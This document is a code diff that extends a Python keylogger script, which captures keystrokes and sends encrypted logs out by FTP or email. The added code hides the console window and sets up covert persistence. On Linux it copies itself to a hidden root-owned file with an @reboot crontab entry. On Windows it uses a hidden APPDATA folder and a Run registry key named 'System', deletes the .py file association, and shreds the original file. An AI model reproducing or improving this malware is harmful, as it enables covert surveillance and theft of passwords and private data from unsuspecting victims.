@@ -24,9 +24,14 @@ from threading import Timer
 import time
 import ftplib
 import datetime
+import shutil
+import stat
 if os.name == "nt":
     import win32api
     import win32con
+    import winreg
+    import win32console
+    import win32gui
 
 METHOD = "ftp" # or "email"
 EMAIL = {
@@ -94,9 +99,12 @@ class Keylogger():
 
     def sysinfo(self):
         hostname = socket.gethostname()
-        ip_info = json.load(urlopen("http://ipinfo.io/json"))
-        ip = ip_info["ip"]
-        geolocation = f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}"
+        try:
+            ip_info = json.load(urlopen("http://ipinfo.io/json"))
+            ip = ip_info["ip"]
+            geolocation = f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}"
+        except:
+            pass
         system = f"{platform.system()} {platform.release()}"
         arch = platform.machine()
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
@@ -196,7 +204,58 @@ class Keylogger():
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         self.log += name
+    
+    
+    def hide(self):
+        if self.os == "nt":
+            window = win32console.GetConsoleWindow()
+            win32gui.ShowWindow(window,0)
+            return True
+        else:
+            return False
 
+    def persistence(self):
+        current_path = os.path.realpath(__file__)
+        if self.os != "nt":
+            os.mkdir("/usr/.tmp/")
+            newpath = "/usr/.tmp/.lynx"
+            shutil.copyfile(current_path, newpath)
+            os.chmod(newpath, stat.S_IEXEC)
+            os.chown(newpath, 0, 0)
+            f = open("/etc/crontab", "r")
+            crontab = f.read()
+            f.close()
+            crontab = crontab.splitlines()
+            if "@reboot /usr/.tmp/.lynx" in crontab:
+                pass
+            else:
+                with open("/etc/crontab", "a") as file:
+                    file.write("@reboot /usr/.tmp/.lynx")
+            self.shred(current_path)
+            os.system("/usr/.tmp/.lynx&")
+        else:
+            self.hide()
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, "\\.py", 0, winreg.KEY_ALL_ACCESS)
+                winreg.DeleteKey(key, "")
+            except FileNotFoundError:
+                pass
+            filename = os.path.basename(current_path)
+            newpath = f"{os.environ['APPDATA']}\\wJdYlVqjMW"
+            if os.path.exists(newpath):
+                pass
+            else:
+                os.mkdir(newpath)
+                newpath = f"{newpath}\\{filename}"
+                shutil.copyfile(current_path, newpath)
+                win32api.SetFileAttributes(newpath, win32con.FILE_ATTRIBUTE_HIDDEN)
+                win32api.SetFileAttributes(f"{os.environ['APPDATA']}\\wJdYlVqjMW", win32con.FILE_ATTRIBUTE_HIDDEN)
+            key_value= r'Software\Microsoft\Windows\CurrentVersion\Run'
+            key_to_change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_value , 0, winreg.KEY_ALL_ACCESS)
+            winreg.SetValueEx(key_to_change, "System", 0, winreg.REG_SZ, newpath)
+            self.shred(current_path)
+            os.system(f"start {newpath}")
+            
     def report(self):
         # Timer
         class RepeatTimer(Timer):
@@ -219,6 +278,8 @@ class Keylogger():
         timer.start()
 
     def run(self):
+        if self.os == "nt":
+            self.hide()
         self.sysinfo()
         Keyboard.on_press(self.callback)
         time.sleep(self.interval)
@@ -262,5 +323,15 @@ class Encryption():
         key = self.RSAencrypt(self.key)
         return f"\nLogs:\n{logs}\n\n\nKey:\n{key}\n\n"
 
+
 keylogger = Keylogger()
-keylogger.run()
+if os.name == "nt":
+    if os.path.realpath(__file__) == f"{os.environ['APPDATA']}\\wJdYlVqjMW\\{os.path.basename(__file__)}":
+        keylogger.run()
+    else:
+        keylogger.persistence()
+else:
+    if os.path.realpath(__file__) == "/usr/.tmp/.lynx":
+        keylogger.run()
+    else:
+        keylogger.persistence()
